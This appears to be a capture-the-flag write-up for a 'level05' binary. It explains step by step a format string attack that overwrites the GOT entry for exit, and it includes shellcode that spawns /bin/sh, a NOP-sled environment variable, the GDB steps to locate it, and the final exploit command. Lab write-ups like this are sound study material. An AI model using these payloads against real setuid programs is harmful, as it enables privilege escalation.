@@ -1,0 +1,19 @@
+1. We find that the binary call printf with a stdin input as format string. The binary is then vulnerable from format string attack.
+2. Before executing our printf, the program do a lowercaser on the buffer. So it make the buffer overflow difficult as it has at great chance to corrupt a shellcode.
+3. The main function does not end by a return but with a call of exit. The GOT of the binary is writable so we decided to overwrite the address resolved of exit by an address in the stack.
+4. A second option to insert data in a binary is the environment variables.
+	a. So we choose this shellcode :
+	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+	b. We created the env var with this command :
+	export EGG=$(perl -e 'print "\x90"x1024 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+5. We also built a printf format string attack (the Xs are decimal value of the target address where we want to redirect the execution flow) :
+	perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%XXXXx" . "%10\$hn" . "%XXXx" . "%11\$hn"'
+6. We finally needed to find the address of the environment variable.
+	a. We opened GDB gdb ./level05
+	b. Put a breakpoint : b *main+200
+	c. Run the program : r <<< $(perl -e 'print "HELLO"')
+	d. Print environnement variable as hex : x/200x environ
+	e. We found the NOPs and took and address in the middle : FFFFD77C
+7. Here is the final exploit command (be sure to correctly have the env var set) :
+	(perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%55156x" . "%10\$hn" . "%10371x" . "%11\$hn"'; cat) | ~/level05
+
